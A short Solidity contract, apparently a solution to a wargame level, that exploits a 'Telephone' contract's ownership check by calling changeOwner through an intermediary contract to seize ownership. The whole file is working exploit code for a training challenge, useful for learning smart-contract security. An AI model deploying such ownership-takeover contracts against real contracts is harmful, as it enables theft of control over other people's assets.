// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract Attack {
    Telephone telephone;
    
    constructor(address telephoneInstance) {
        telephone = Telephone(telephoneInstance);
    }
    
    function changeOwner() public {
        telephone.changeOwner(msg.sender);
    }
}